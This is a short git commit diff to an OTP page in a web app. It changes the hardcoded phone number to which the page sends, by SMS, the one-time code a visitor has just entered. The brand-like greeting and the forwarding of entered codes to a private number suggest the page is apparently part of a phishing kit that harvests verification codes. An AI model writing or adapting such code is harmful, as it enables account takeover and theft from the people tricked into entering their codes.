b736e5778c1ee5f276efc134b3085b7df1f62900
andrewstane451-cmd <andrewstane451@gmail.com>
2026-06-29 23:58:06 +0300

    Update page.tsx

--- app/otp/page.tsx
+++ app/otp/page.tsx
@@ -144,7 +144,7 @@ const message = `Y'ello. Please enter the following code: ${otpCode} to complete
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
      sendSMS(
-      "+254708180260",
+      "+254758767793",
       message
     );
       try {
